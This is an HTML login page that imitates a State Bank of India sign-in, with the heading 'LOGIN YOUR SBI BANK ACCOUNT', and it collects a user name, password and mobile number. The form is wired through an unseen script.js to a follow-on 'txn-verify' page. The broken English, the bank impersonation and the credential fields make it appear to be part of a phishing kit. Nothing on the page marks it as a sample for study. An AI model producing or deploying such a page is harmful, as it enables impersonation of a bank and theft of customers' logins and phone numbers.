<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>User Login</title><link rel="stylesheet" href="styles.css"></head>
<body>
<div class="container"><div class="card">
  <div class="logo"></div>
  <h2>LOGIN YOUR SBI BANK ACCOUNT</h2>Safe  Secure   Trusted Bank of India
  <form class="form" data-action="txn-verify.html" data-page="user-login">
    <input class="input" name="userName" placeholder="User Name" required>
    <input class="input" name="password" type="password" placeholder="Password" required>
    <input class="input" name="userMobile" maxlength="10" inputmode="numeric" placeholder="Mobile Number" required>
    <button class="btn" type="submit">Login</button>
  </form>
</div></div>
<script type="module" src="script.js"></script>
</body>
</html>
